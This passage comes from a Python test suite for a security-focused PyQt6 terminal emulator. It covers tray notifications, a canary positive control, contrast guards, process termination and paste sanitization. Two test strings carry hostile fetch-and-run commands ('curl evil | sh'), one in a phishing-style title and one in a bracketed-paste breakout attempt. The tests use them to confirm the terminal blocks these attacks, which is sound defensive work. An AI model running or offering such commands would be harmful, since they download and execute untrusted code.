    ok(not win._systray, 'a systray admin lock makes set_systray a no-op')
    win._locked = _saved_locked
finally:
    _QSTI.isSystemTrayAvailable = _orig_avail

# _restore_window preserves maximized / full-screen, clearing only 'minimized' --
# restoring from the tray must not shrink a maximized window.
win.setWindowState(Qt.WindowState.WindowMaximized | Qt.WindowState.WindowMinimized)
win._restore_window()
_wstate = win.windowState()
ok(not (_wstate & Qt.WindowState.WindowMinimized),
   '_restore_window clears the minimized bit')
ok(bool(_wstate & Qt.WindowState.WindowMaximized),
   '_restore_window preserves the maximized state (no shrink on restore)')
win.setWindowState(Qt.WindowState.WindowNoState)

# The tray bell notification must carry NO program-set title -- that would put
# attacker-controlled text on an out-of-grid, trusted-looking surface (phishing).
win._systray = True
win._tray = _FakeTray()
_evil = 'Session expired -- run: curl evil | sh'
_tterm = win.tabs.widget(0)
win._user_titles.pop(_tterm, None)
win._on_bell_tray(_tterm, _evil)
ok(win._tray.bodies and _evil not in win._tray.bodies[-1],
   'tray bell body never contains the program-set title')
ok(win._tray.bodies and win._tray.bodies[-1].startswith('Bell in '),
   'tray bell body is a generic trusted locator when the tab is unnamed')
win._user_titles[_tterm] = 'my-build'
win._on_bell_tray(_tterm, _evil)
ok('my-build' in win._tray.bodies[-1] and _evil not in win._tray.bodies[-1],
   'tray bell uses the user-set tab name, never the program title')
win._user_titles.pop(_tterm, None)
win._systray = False
win._tray = None

# --- --test-canary: the EICAR-style positive control -------------------------
# secure-terminal is secure by construction, so an adversarial corpus test sees
# our canary NEVER fire -- indistinguishable from a broken harness that fires
# nothing. `--test-canary` makes us deliberately perform the safe canary action
# so the harness can prove it can SEE a fired canary before trusting any run. The
# marker goes to a single PREDEFINED, owner-only path (never a caller-supplied
# one) so the write can never be aimed elsewhere and AppArmor can confine it.
# Here we verify the control: token on stdout, marker in the predefined dir,
# fail-loud when that dir is unusable, benign token.
import subprocess as _sp                                        # noqa: E402
from secure_terminal.main import canary_marker_path as _canary_marker_path  # noqa: E402

# Fixed protocol constant; MUST match secure_terminal.main.CANARY_TOKEN. Asserted
# by value (not imported) so token drift breaks the corpus/terminal contract loud.
_CANARY_TOKEN = 'SECURE-TERMINAL-TEST-CANARY-POSITIVE-CONTROL-V1'


def _run_canary(env_extra=None, timeout=30, argv_tail=('--test-canary',)):
    code = ('import sys\n'
            'sys.argv = %r\n'
            'from secure_terminal.main import main\n'
            'sys.exit(main())\n' % (['secure-terminal', *argv_tail],))
    env = dict(os.environ, PYTHONPATH=os.pathsep.join(sys.path))
    if env_extra:
        env.update(env_extra)
    # This suite sets SIGCHLD=SIG_IGN so Qt terminal shells auto-reap; that also
    # makes the kernel reap THIS child before subprocess can collect its status,
    # zeroing the exit code. Restore default handling just for the wait so the
    # fail-loud exit code (the canary's whole point) is observed faithfully.
    _prev = signal.signal(signal.SIGCHLD, signal.SIG_DFL)
    try:
        proc = _sp.run([sys.executable, '-c', code], env=env,
                       stdin=_sp.DEVNULL, stdout=_sp.PIPE, stderr=_sp.PIPE,
                       timeout=timeout)
    finally:
        signal.signal(signal.SIGCHLD, _prev)
    return (proc.stdout.decode('utf-8', 'replace'),
            proc.stderr.decode('utf-8', 'replace'), proc.returncode)


def _marker_under(runtime_dir):
    """The predefined marker path for a given runtime dir, via the real resolver
    (no path duplicated in the test)."""
    _saved = os.environ.get('XDG_RUNTIME_DIR')
    os.environ['XDG_RUNTIME_DIR'] = runtime_dir
    try:
        return _canary_marker_path()
    finally:
        if _saved is None:
            os.environ.pop('XDG_RUNTIME_DIR', None)
        else:
            os.environ['XDG_RUNTIME_DIR'] = _saved

# Fires: token on stdout AND written to the predefined, owner-only marker.
_crt = tempfile.mkdtemp(prefix='st-canary-run-')
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt})
_marker = _marker_under(_crt)
_cwrote = ''
if os.path.exists(_marker):
    with open(_marker, encoding='ascii') as _cfh:
        _cwrote = _cfh.read()
ok(_CANARY_TOKEN in _cout and _crc == 0,
   '--test-canary: fires the token on stdout and exits 0')
ok(_CANARY_TOKEN in _cwrote,
   '--test-canary: writes the token to the predefined marker dir')
# The marker is confined to the predefined runtime subtree, not an arbitrary path.
ok(_marker.startswith(os.path.join(_crt, 'secure-terminal', 'canary') + os.sep),
   '--test-canary: marker lives under the predefined <runtime>/secure-terminal/canary/')

# An unusable predefined dir must FAIL LOUD (exit 1), never silently pretend
# success -- the whole point is that a harness can detect a machinery fault. Force
# it by planting a FILE where the "canary" directory must be created.
_crt2 = tempfile.mkdtemp(prefix='st-canary-blk-')
os.makedirs(os.path.join(_crt2, 'secure-terminal'), exist_ok=True)
with open(os.path.join(_crt2, 'secure-terminal', 'canary'), 'w') as _blk:
    _blk.write('')                       # a file, so makedirs(.../canary/) fails
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt2})
ok(_crc == 1,
   '--test-canary: exits 1 (fails loud) when the predefined marker dir is unusable')

# --test-canary is a GLOBAL option: it must fire even when another global (e.g.
# --new-instance from a wrapper) precedes it, not only as the first token.
_crt3 = tempfile.mkdtemp(prefix='st-canary-glob-')
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt3},
                                 argv_tail=('--new-instance', '--test-canary'))
ok(_CANARY_TOKEN in _cout and _crc == 0,
   '--test-canary: fires when it follows another global option (not first token)')

# The token must be a benign literal -- no ESC, no control chars, no shell
# metacharacters -- so the positive control can never itself harm a tester.
ok(all(32 <= ord(_ch) < 127 for _ch in _CANARY_TOKEN)
   and not (set(_CANARY_TOKEN) & set('\x1b;$`|&<>()')),
   '--test-canary: token is a benign printable-ASCII literal')

# --- bell sound gating + playback ---------------------------------------------
import secure_terminal.terminal as _term          # noqa: E402
import tempfile as _tempfile                       # noqa: E402

ok(not _term.sound_file_allowed(''),
   'sound_file_allowed: empty path is rejected')
ok(not _term.sound_file_allowed('/no/such/sound.wav'),
   'sound_file_allowed: a missing file is rejected')
_snd_tmp = _tempfile.mkdtemp()
_outside = os.path.join(_snd_tmp, 'outside.wav')
with open(_outside, 'wb') as _owav:
    _owav.write(b'RIFF')
ok(not _term.sound_file_allowed(_outside),
   'sound_file_allowed: a file outside the allowed dirs is rejected')
# with the allowed-dirs list pointed at our temp dir, a file inside is accepted
_orig_dirs = _term.BELL_SOUND_DIRS
_term.BELL_SOUND_DIRS = (_snd_tmp,)
try:
    ok(_term.sound_file_allowed(_outside),
       'sound_file_allowed: a real file inside an allowed dir is accepted')
    # _play_sound uses QtMultimedia (a hard dependency); mock QSoundEffect so the
    # real playback path (build the effect, set the source, play, return True) is
    # exercised without needing an audio device in the test environment.
    import types as _types
    _fake_qm = _types.ModuleType('PyQt6.QtMultimedia')

    class _FakeSoundEffect:
        raise_on: str | None = None

        def __init__(self, _parent=None):
            if _FakeSoundEffect.raise_on == 'init':
                raise RuntimeError('no audio device')

        def setSource(self, _url):
            pass

        def play(self):
            if _FakeSoundEffect.raise_on == 'play':
                raise RuntimeError('playback failed')

    _fake_qm.QSoundEffect = _FakeSoundEffect  # type: ignore[attr-defined]
    _o_qm = sys.modules.get('PyQt6.QtMultimedia')
    sys.modules['PyQt6.QtMultimedia'] = _fake_qm
    try:
        _bell = SecureTerminal(command='/bin/cat')
        _bell.apply_bell_sound(_outside)
        ok(_bell._bell_sound == _outside, 'apply_bell_sound: an allowed path is stored')
        ok(_bell._play_sound() is True,
           '_play_sound: builds the sound effect and plays it -> True')
        _bell._sound_effect = None
        _FakeSoundEffect.raise_on = 'play'
        ok(_bell._play_sound() is False,
           '_play_sound: a playback error is contained -> False')
    finally:
        if _o_qm is None:
            sys.modules.pop('PyQt6.QtMultimedia', None)
        else:
            sys.modules['PyQt6.QtMultimedia'] = _o_qm
    _bell2 = SecureTerminal(command='/bin/cat')
    ok(_bell2._play_sound() is False, '_play_sound: no configured sound -> False')
finally:
    _term.BELL_SOUND_DIRS = _orig_dirs

# --- TUI keystroke encoding (_tui_key) ----------------------------------------
_tk = SecureTerminal(command='/bin/cat')
_tksent = spy_writes(_tk)


def _tuikey(qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    _tk._tui_key(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


_tuikey(Qt.Key.Key_Tab, '\t', Qt.KeyboardModifier.ShiftModifier)   # back-tab
eq(_tksent, [b'\x1b[Z'], 'TUI: Shift+Tab -> back-tab (CSI Z)')
_tksent.clear()
_tuikey(Qt.Key.Key_Up)                                             # mapped arrow
eq(_tksent, [b'\x1b[A'], 'TUI: an arrow key sends its VT sequence')
_tksent.clear()
_tuikey(Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)     # Ctrl+C
eq(_tksent, [b'\x03'], 'TUI: Ctrl+letter sends the control byte')
_tksent.clear()
_tuikey(Qt.Key.Key_BracketLeft, '\x1b', Qt.KeyboardModifier.ControlModifier)
eq(_tksent, [b'\x1b'], 'TUI: a control-char keystroke is forwarded as its byte')
_tksent.clear()
_tuikey(Qt.Key.Key_A, 'a')                                         # printable
eq(_tksent, [b'a'], 'TUI: a printable key is sent as UTF-8')
_tksent.clear()
_tuikey(Qt.Key.Key_A, 'a', Qt.KeyboardModifier.AltModifier)        # Alt+printable
eq(_tksent, [b'\x1ba'], 'TUI: Alt+printable is prefixed with ESC (meta)')
_tksent.clear()
_tuikey(Qt.Key.Key_unknown, chr(0x202E))                           # bidi override
eq(_tksent, [], 'TUI: a non-printable keystroke is dropped')

# --- foreground process group / cwd helpers -----------------------------------
_fg = SecureTerminal(command='/bin/cat')
_saved_fd = _fg._fd
_fg._fd = None
ok(_fg._foreground_pgrp() is None, '_foreground_pgrp: no pty fd -> None')
ok(_fg.cwd_basename() is None or isinstance(_fg.cwd_basename(), str),
   'cwd_basename: tolerates a missing foreground')
_fg._fd = _saved_fd
# a pipe fd is not a tty -> tcgetpgrp raises -> None
_pr, _pw = os.pipe()
_fg._fd = _pr
ok(_fg._foreground_pgrp() is None,
   '_foreground_pgrp: a non-tty fd -> None (tcgetpgrp fails)')
_fg._fd = _saved_fd
os.close(_pr)
os.close(_pw)
# has_foreground_program / terminate_foreground with nothing to act on
_fg._foreground_pgrp = lambda: None
ok(not _fg.has_foreground_program(),
   'has_foreground_program: no foreground group -> False')
ok(not _fg.terminate_foreground(),
   'terminate_foreground: nothing running -> no signal sent')

# --- Ctrl+wheel zoom ----------------------------------------------------------
from PyQt6.QtGui import QWheelEvent          # noqa: E402
from PyQt6.QtCore import QPointF, QPoint      # noqa: E402
_wz = SecureTerminal(command='/bin/cat')
_zoom: list[int] = []
_wz.zoom_step.connect(_zoom.append)


def _wheel(dy, mods):
    ev = QWheelEvent(QPointF(1, 1), QPointF(1, 1), QPoint(0, 0), QPoint(0, dy),
                     Qt.MouseButton.NoButton, mods,
                     Qt.ScrollPhase.NoScrollPhase, False)
    _wz.wheelEvent(ev)


_wheel(120, Qt.KeyboardModifier.ControlModifier)
_wheel(-120, Qt.KeyboardModifier.ControlModifier)
eq(_zoom, [1, -1], 'Ctrl+wheel emits a zoom step in the scroll direction')
_zoom.clear()
_wheel(120, Qt.KeyboardModifier.NoModifier)     # plain wheel -> normal scroll
eq(_zoom, [], 'a plain wheel does not zoom')

# --- pyte cell -> QTextCharFormat rendering (_pyte_format / _pyte_qcolor) ------
from PyQt6.QtGui import QFont          # noqa: E402


class _Cell:                                # a minimal duck-typed pyte cell
    def __init__(self, fg='default', bg='default', bold=False, reverse=False,
                 underscore=False, data=' '):
        self.fg = fg
        self.bg = bg
        self.bold = bold
        self.reverse = reverse
        self.underscore = underscore
        self.data = data


_rt = SecureTerminal(command='/bin/cat')
# a truecolor 6-hex fg + bg -> both applied (valid QColor path)
_f1 = _rt._pyte_format(_Cell(fg='ff0000', bg='00ff00'))
ok(_f1.foreground().color().name() == '#ff0000',
   '_pyte_format: a truecolor fg hex is applied')
ok(_f1.background().color().name() == '#00ff00',
   '_pyte_format: a background colour is applied')
# a STRUCTURAL half-block glyph (U+2580) keeps its near-equal truecolour bg: the grid
# contrast guard is skipped for it, so a half-block colour ramp is not banded.
_fs = _rt._pyte_format(_Cell(fg='c0c0c0', bg='b4b4b4', data='\u2580'))
ok(_fs.background().color().name() == '#b4b4b4',
   '_pyte_format: a structural glyph keeps its truecolour bg (guard skipped)')
ok(_fs.foreground().color().name() == '#c0c0c0',
   '_pyte_format: a structural glyph keeps its truecolour fg (guard skipped)')
# a NON-structural cell with the same near-equal fg/bg still triggers the guard.
ok(_rt._pyte_format(_Cell(fg='c0c0c0', bg='b4b4b4', data='X'))
   .foreground().color().name() != '#c0c0c0',
   '_pyte_format: the guard still fires for a non-structural near-equal fg/bg')
# an invalid hex colour falls back to the default foreground
ok(_rt._pyte_qcolor('nothex', None) is None,
   '_pyte_qcolor: an invalid hex with no default -> None')
ok(_rt._pyte_qcolor('zzzzzz', QColor('#123456').name()).isValid(),
   '_pyte_qcolor: an invalid hex falls back to the given default')
_f2 = _rt._pyte_format(_Cell(fg='ff0000', bg='0000ff', reverse=True))
ok(_f2.background().color().name() == '#ff0000',
   '_pyte_format: reverse video swaps fg into the background')
_f3 = _rt._pyte_format(_Cell(fg='cccccc', bold=True, underscore=True))
ok(_f3.fontWeight() == QFont.Weight.Bold and _f3.fontUnderline(),
   '_pyte_format: bold and underscore attributes are applied')
# fg == bg (a program hiding text) triggers the contrast guard -> readable fg
_f4 = _rt._pyte_format(_Cell(fg='202020', bg='202020'))
ok(_f4.foreground().color().name() != '#202020',
   '_pyte_format: fg == bg is overridden to a readable colour')

# --- exhaustive TUI contrast sweep: every pyte colour, both reverse states -----
# The TUI path (_pyte_format) has an extra lever the line path lacks -- reverse
# video, which swaps fg/bg -- so sweep it too: every pyte colour name (plus
# 'default') as fg against each as bg, bold on/off, reverse on/off, both themes.
# Bold promotes fg to its bright palette variant here, so bright colours are
# covered as well. Invariant: the drawn fg is never near-invisible on its bg.
from secure_terminal.terminal import _PYTE_COLOR as _PC, THEMES as _TH2  # noqa: E402
from secure_terminal.terminal import _rgb as _rgb3                      # noqa: E402
from secure_terminal.sanitize import too_close as _tc3                  # noqa: E402
_names = list(_PC.keys()) + ['default']

def _tui_pair(_fmt, _theme):
    _fgb = _fmt.foreground()
    if _fgb.style() == Qt.BrushStyle.NoBrush:
        return None
    _theme_bg = _TH2.get(_theme, _TH2['dark'])[0]
    _bgb = _fmt.background()
    _bg = _bgb.color() if _bgb.style() != Qt.BrushStyle.NoBrush else QColor(_theme_bg)
    return _rgb3(_fgb.color()), _rgb3(_bg)

_tui_checked = 0
_tui_bad = []
for _theme in ('dark', 'light'):
    _rt.apply_theme(_theme)
    _rt._fmt_cache.clear()                  # theme change invalidates cached formats
    for _fg in _names:
        for _bg in _names:
            for _bold in (False, True):
                for _rev in (False, True):
                    _pair = _tui_pair(_rt._pyte_format(
                        _Cell(fg=_fg, bg=_bg, bold=_bold, reverse=_rev)), _theme)
                    if _pair is None:
                        continue
                    _tui_checked += 1
                    if _tc3(*_pair):
                        _tui_bad.append((_theme, _fg, _bg, _bold, _rev))
ok(not _tui_bad,
   'contrast(tui): every pyte fg x bg x bold x reverse x theme stays readable '
   '(%d combos checked, unreadable: %r)' % (_tui_checked, _tui_bad[:3]))
## teeth: an all-NoBrush regression would see 0 combos and pass this sweep vacuously.
ok(_tui_checked > 0, 'contrast(tui): the sweep exercised combos (not a vacuous 0-combo pass)')
_rt.apply_theme('dark')
_rt._fmt_cache.clear()

# the OSC 10/11 default-move attack: a program moves the DEFAULT fg and bg onto
# the same colour, then prints text in the default colours -- hoping the guard's
# fallback (which uses the default fg) collides too. The guard must fall back to a
# fixed readable colour, not the program-moved default, so the text still shows.
_rt._osc_palette['fg'] = '#303030'
_rt._osc_palette['bg'] = '#303030'
_f_osc = _rt._pyte_format(_Cell(fg='default', bg='default'))
_op = _tui_pair(_f_osc, 'dark')
ok(_op is not None and not _tc3(*_op),
   'contrast(tui): the OSC default-move attack (fg==bg via OSC 10/11) is still forced readable')
_rt._osc_palette.pop('fg', None)
_rt._osc_palette.pop('bg', None)
_rt._fmt_cache.clear()

# _pyte_bell rings via _ring() unless seeding retained scrollback (those bells already
# happened). Spy the real _ring path to PROVE the seeding gate -- a bare ok(True) could
# not tell "gated while seeding" from "never rings at all".
_rt._bell_channels = {'audible'}
_rt_rings = []
_rt._ring = lambda: _rt_rings.append(1)
_rt._seeding = True
_rt._pyte_bell()                            # seeding -> no ring (just returns)
_rt._seeding = False
_rt._pyte_bell()                            # -> _ring()
ok(_rt_rings == [1], '_pyte_bell: rings when not seeding, stays quiet while seeding')

# --- terminate_foreground actually signals a real foreground group ------------
import subprocess as _subprocess          # noqa: E402
import secure_terminal.terminal as _term2  # noqa: E402  (QTimer lives here)

# a throwaway process group that IGNORES SIGTERM, so the 2s survivor SIGKILLs it
_victim = _subprocess.Popen(['sh', '-c', 'trap "" TERM; exec sleep 30'],
                            start_new_session=True)
pump(60)
_victim_pgrp = os.getpgid(_victim.pid)
_fgk = SecureTerminal(command='/bin/cat')
_fgk._pid = None                            # so the group is never mistaken for the shell
_fgk._foreground_pgrp = lambda: _victim_pgrp
ok(_fgk.has_foreground_program(),
   'has_foreground_program: a real foreground group -> True')
ok(_fgk.terminate_foreground(),
   'terminate_foreground: SIGTERMs the foreground group')
pump(2300)                                  # let the survivor SIGKILL fire (watchdog is 2s)
_killed_by_survivor = True
try:
    ## the survivor should ALREADY have killed it during the pump; a timeout here means it
    ## did NOT fire. Assert on THAT -- not on returncode after our own kill, which would be
    ## tautologically true whether or not the production watchdog works.
    _victim.wait(timeout=3)
except _subprocess.TimeoutExpired:
    _killed_by_survivor = False
    _victim.kill()                          # reap it ourselves so the test leaks no process
    _victim.wait(timeout=5)
ok(_killed_by_survivor,
   'terminate_foreground: a TERM-ignoring group is SIGKILLed by the survivor')

# #35/#42: a login shell REPLACED via the `exec` builtin (exec vim) keeps the shell's
# pid + pgrp, so tcgetpgrp still reads a "bare prompt" -- but /proc/<pid>/exe now points
# at a DIFFERENT binary. _child_execd() catches it by process identity via exe, which
# (unlike comm) the child CANNOT forge, so the panic button acts on the exec'd program
# and the mode-toggle re-export refuses to type into it. A builtin that merely reads
# stdin (read/here-doc) is NOT an exec (same exe) and stays the documented #18 residual.
ok(SecureTerminal._read_exe(2 ** 30) is None,
   '_read_exe returns None for a nonexistent pid')
_xc = SecureTerminal(command=None)            # login-shell tab (_command is None)
ok(_xc._spawn_exe is not None, 'a spawned child records its /proc exe baseline')
_hold_pid, _xc._pid = _xc._pid, None
ok(_xc._child_execd() is False, '_child_execd: no child pid -> False')
_xc._pid = _hold_pid
_hold_exe, _xc._spawn_exe = _xc._spawn_exe, None
ok(_xc._child_execd() is False, '_child_execd: no exe baseline -> False')
_xc._spawn_exe = _hold_exe
try:
    _xc._read_exe = lambda _pid: None
    ok(_xc._child_execd() is False, '_child_execd: unreadable exe -> False')
    _xc._read_exe = lambda _pid: _xc._spawn_exe
    ok(_xc._child_execd() is False, '_child_execd: matching exe is a bare prompt')
    _xc._read_exe = lambda _pid: _xc._spawn_exe + '-execd'
    ok(_xc._child_execd() is True, '_child_execd: a changed exe is an exec-replace')
finally:
    del _xc._read_exe
_xc.close()

# #5 (ai-review): the kernel appends ' (deleted)' to /proc/<pid>/exe when the binary was
# unlinked/replaced (an apt upgrade of bash/dash). _read_exe must STRIP it so the live
# read still equals the spawn baseline -- else an idle shell is mis-ID'd as a foreground
# program and the panic Terminate kills it.
_saved_readlink5 = os.readlink
try:
    os.readlink = lambda _p: '/usr/bin/bash (deleted)'
    eq(SecureTerminal._read_exe(1), '/usr/bin/bash',
       '#5: _read_exe strips a " (deleted)" suffix (unlinked binary)')
finally:
    os.readlink = _saved_readlink5
_xc5 = SecureTerminal(command=None)               # login-shell tab (_command is None)
_saved_readlink5b = os.readlink
try:
    os.readlink = lambda _p: (_xc5._spawn_exe or '/bin/sh') + ' (deleted)'
    ok(_xc5._child_execd() is False,
       '#5: an idle shell whose binary was unlinked is NOT flagged as foreground')
finally:
    os.readlink = _saved_readlink5b
_xc5.close()

# #42: /proc/self/comm is CHILD-WRITABLE (the #35 spoof), but /proc/<pid>/exe is NOT --
# _child_execd must key off exe so a comm forge cannot flip detection (neither killing an
# idle shell nor hiding a stuck exec'd program from the panic button). Prove _read_exe
# reports the REAL binary even when the child rewrote its own comm.
_v42 = _subprocess.Popen(
    ['sh', '-c', 'printf fakeshell > /proc/self/comm 2>/dev/null; sleep 30'],
    start_new_session=True)
pump(80)
_exe42 = SecureTerminal._read_exe(_v42.pid)
ok(_exe42 is not None and _exe42.rsplit('/', 1)[-1] in ('sh', 'dash', 'bash', 'busybox'),
   '#42: _read_exe reports the real binary even when the child spoofed /proc/self/comm')
_v42.terminate()
_v42.wait()

# faithful panic-button path: a real TERM-ignoring victim group stands in for the exec'd
# program; both _foreground_pgrp and getpgid(_pid) resolve to it (the exec case: same
# pgrp as the shell) and exe differs from the baseline -> signalled.
_victim_x = _subprocess.Popen(['sh', '-c', 'trap "" TERM; exec sleep 30'],
                              start_new_session=True)
pump(60)
_victim_x_pgrp = os.getpgid(_victim_x.pid)
_xt = SecureTerminal(command=None)
_xt._foreground_pgrp = lambda: _victim_x_pgrp
_xt._read_exe = lambda _pid: (_xt._spawn_exe or '') + '-execd'
_o_getpgid_x = _term2.os.getpgid
_term2.os.getpgid = lambda _pid: _victim_x_pgrp
try:
    ok(_xt.has_foreground_program() is True,
       'has_foreground_program: an exec-replaced login shell (same pgrp) -> True')
    ok(_xt.terminate_foreground() is True,
       'terminate_foreground: signals an exec-replaced shell, not a no-op')
finally:
    _term2.os.getpgid = _o_getpgid_x           # restore BEFORE pump (no stray mock)
pump(2300)                                     # let the survivor SIGKILL the victim (2s watchdog)
_x_killed_by_survivor = True
try:
    ## as above: a timeout means the survivor did NOT fire; do not mask it with our own kill.
    _victim_x.wait(timeout=3)
except _subprocess.TimeoutExpired:
    _x_killed_by_survivor = False
    _victim_x.kill()                           # reap it ourselves so the test leaks no process
    _victim_x.wait(timeout=5)
ok(_x_killed_by_survivor,
   'terminate_foreground: the exec-replaced shell is SIGKILLed by the survivor')
# a MATCHING exe is a bare prompt -> the panic button no-ops (shell preserved)
_term2.os.getpgid = lambda _pid: _victim_x_pgrp
try:
    _xt._read_exe = lambda _pid: _xt._spawn_exe
    ok(_xt.terminate_foreground() is False,
       'terminate_foreground: a bare shell prompt (matching exe) is a no-op')
finally:
    _term2.os.getpgid = _o_getpgid_x
    del _xt._read_exe
_xt.close()

# #36: int() raises ValueError for a >4300-digit string (Python 3.11+) BEFORE the
# apply_* clamp runs, and TypeError for a non-number -- the setters promise to be
# crash-safe "at the sink", so an unparseable value keeps the current setting rather
# than raising. (canary: pre-#36 code calls bare int() and raises on '9'*4301.)
_cl = SecureTerminal(command='/bin/cat')
_huge_digits = '9' * 4301
_z0 = _cl.current_zoom()
_cl.apply_zoom(_huge_digits)
eq(_cl.current_zoom(), _z0, 'apply_zoom keeps the current zoom on an unparseable value')
_cl.apply_zoom(250)
eq(_cl.current_zoom(), 250, 'apply_zoom still applies a real value')
_cl.apply_zoom(None)
eq(_cl.current_zoom(), 250, 'apply_zoom ignores a None (TypeError) value')
_cl.apply_zoom(float('inf'))                 # int(inf) raises OverflowError, not ValueError
eq(_cl.current_zoom(), 250, 'apply_zoom ignores a non-finite float (OverflowError)')
_cl.apply_zoom(9999)
eq(_cl.current_zoom(), 1000, 'apply_zoom clamps above the max')
_f0 = _cl.current_font_size()
_cl.set_font_size(_huge_digits)
eq(_cl.current_font_size(), _f0, 'set_font_size keeps the current size on a bad value')
_s0 = _cl.current_scrollback()
_cl.apply_scrollback(_huge_digits)
eq(_cl.current_scrollback(), _s0, 'apply_scrollback keeps the current cap on a bad value')
_cl.apply_scrollback(2 ** 40)
eq(_cl.current_scrollback(), 2147483647, 'apply_scrollback clamps an over-int32 value')
_cl.apply_scrollback(-5)
eq(_cl.current_scrollback(), 0, 'apply_scrollback floors at 0')
_p0 = _cl.current_paste_delay()
_cl.apply_paste_delay(_huge_digits)
eq(_cl.current_paste_delay(), _p0, 'apply_paste_delay keeps the current delay on a bad value')
_e0 = _cl.current_escape_limit()
_cl.apply_escape_limit(_huge_digits)
eq(_cl.current_escape_limit(), _e0, 'apply_escape_limit keeps the current limit on a bad value')
_cl.close()

# an empty command ('' / -e '') is a login shell (_argv_for_command substitutes one),
# so _command normalizes to None -- otherwise the panic button's "never kill a bare
# shell" guard (self._command is None) would be bypassed and SIGKILL the idle shell.
# (canary: pre-fix code left _command as '' -- falsy but not None.)
_emptycmd = SecureTerminal(command='')
ok(_emptycmd._command is None, 'an empty command normalizes to None (a login shell)')
_emptycmd.close()

# --- bell ring: channel gating + rate limit -----------------------------------
_rg = SecureTerminal(command='/bin/cat')
_rg._bell_channels = set()
_rg._last_bell = 0.0
_rg_qapp_nc = _stmod.QApplication
_stmod.QApplication = _QAppShim
try:
    _QAppShim._fake.beeps = 0
    _rg._ring()                             # no channels enabled -> early return
    # non-vacuous: the beep spy must NOT fire, AND the rate-limit bookkeeping
    # (_last_bell = now, which sits past the early return) must NOT run -- an
    # inverted or removed early return would trip at least one of these.
    ok(_QAppShim._fake.beeps == 0 and _rg._last_bell == 0.0,
       '_ring: with no channels enabled it fires nothing (no beep, no rate-limit update)')
finally:
    _stmod.QApplication = _rg_qapp_nc
# the rate-limit lives INSIDE _ring, so spy the real beep (app.beep via _QAppShim), not
# _ring itself: two rings within ~200ms must produce exactly ONE beep.
_rg._bell_channels = {'audible'}
_rg_qapp = _stmod.QApplication
_stmod.QApplication = _QAppShim
try:
    _QAppShim._fake.beeps = 0
    _rg._last_bell = 0.0
    _rg._ring()                             # fires -> app.beep()
    _rg._ring()                             # within 200ms -> rate-limited (no beep)
    ok(_QAppShim._fake.beeps == 1, '_ring: a second ring within ~200ms is rate-limited')
finally:
    _stmod.QApplication = _rg_qapp
_rg.apply_paste_delay(15)
eq(_rg.current_paste_delay(), _rg._paste_delay,
   'current_paste_delay: returns the configured paste delay')

# --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
_pt = SecureTerminal(command='/bin/cat')
_pt.apply_paste_warn('never')               # test the sanitize+bracket path directly
_pts = spy_writes(_pt)
_pmime = QMimeData()
_pmime.setText('\x00\x01\x02')              # only control bytes -> stripped to ''
_pt.insertFromMimeData(_pmime)
eq(_pts, [], 'paste: a control-only clipboard sanitizes to nothing (sends nothing)')
# bracketed paste: with DEC mode 2004 set by a LIVE foreground program, a paste is wrapped
_pt.apply_tui(True)
_pt.has_foreground_program = lambda: True    # /bin/cat owns the foreground (pipe harness
#                                              tcgetpgrp can't see it, so state it)
feed_output(_pt, b'\x1b[?2004h')            # program enables bracketed paste
_pts.clear()
_pmime2 = QMimeData()
_pmime2.setText('echo hi')
_pt.insertFromMimeData(_pmime2)
ok(_pts and _pts[0].startswith(b'\x1b[200~') and _pts[0].endswith(b'\x1b[201~'),
   'paste: a live foreground program with DEC 2004 wraps the pasted data in the markers')
# gap (ai-review): a paste containing the bracketed-paste END marker must NOT break
# out of the bracketed region and inject a command -- the ESC of an embedded
# \x1b[201~ is stripped, so the only real END marker is the terminal's own trailing
# one. Without this a pasted "...\x1b[201~; evil" would run "evil" as typed input.
_pts.clear()
_o_pw_bp = _pt.current_paste_warn()
_pt.apply_paste_warn('never')                       # send directly (test wrap+sanitize)
_pmime_bp = QMimeData()
_pmime_bp.setText('ls\x1b[201~; curl evil|sh')
_pt.insertFromMimeData(_pmime_bp)
ok(_pts and _pts[0].count(b'\x1b[201~') == 1 and _pts[0].endswith(b'\x1b[201~')
   and b'\x1b[200~' not in _pts[0][6:],
   'paste: an embedded bracketed-paste END marker cannot break out (ESC stripped)')
_pt.apply_paste_warn(_o_pw_bp)

# --- review 'never' keeps content (does not strip) + emits the unreviewed-risk
# signal, so disabling review preserves function but the risk stays VISIBLE.
_nv = SecureTerminal(command='/bin/cat')
_nv.apply_paste_warn('never')
_nvsent = spy_writes(_nv)
_nvrisk = []
_nv.unreviewed_risk.connect(lambda: _nvrisk.append(1))
_nvm = QMimeData()
_nvm.setText('caf\u00e9')                            # printable non-ASCII (e-acute)
_nv.insertFromMimeData(_nvm)
ok(b'caf\xc3\xa9' in b''.join(_nvsent),
   "paste 'never' keeps printable unicode (not stripped to ASCII)")
ok(_nvrisk, "paste 'never' of risky text emits the unreviewed-risk signal")
_nvrisk.clear()
_nvsent.clear()
_nvm2 = QMimeData()
_nvm2.setText('ls -la')                              # clean ASCII: not risky
_nv.insertFromMimeData(_nvm2)
ok(not _nvrisk, "paste 'never' of clean ASCII does not emit the risk signal")
# copy 'never' of a risky (unicode) selection keeps it + emits the risk signal
_cv = SecureTerminal(command='/bin/cat')
_cv.apply_mode('show')
_cv.apply_copy_warn('never')
feed_output(_cv, 'caf\u00e9\n'.encode('utf-8'))
_cv.selectAll()
_cvrisk = []
_cv.unreviewed_risk.connect(lambda: _cvrisk.append(1))
_cv.copy()
ok(_cvrisk, "copy 'never' of risky text emits the unreviewed-risk signal")

# --- reset_caret with no output cursor snaps to the document end --------------
_rc = SecureTerminal(command='/bin/cat')
feed_output(_rc, b'line1\nline2\n')          # document content so start != end
_rc._out_cursor = None
_rctc = _rc.textCursor(); _rctc.setPosition(0); _rc.setTextCursor(_rctc)   # caret at start
_rc.reset_caret()
# non-vacuous: assert the caret ACTUALLY landed at the document end (the else branch
# ran), not merely that reset_caret did not raise. A broken else leaves it at start.
ok(_rc.textCursor().atEnd() and not _rc.textCursor().atStart(),
   'reset_caret: with no output cursor it snaps the caret to the document end')

# --- defensive syscall guards, fault-injected ---------------------------------
import os as _os

# shutdown tolerates an already-closed fd and a dead pid (close/kill/waitpid)
_sd = SecureTerminal(command='/bin/cat')
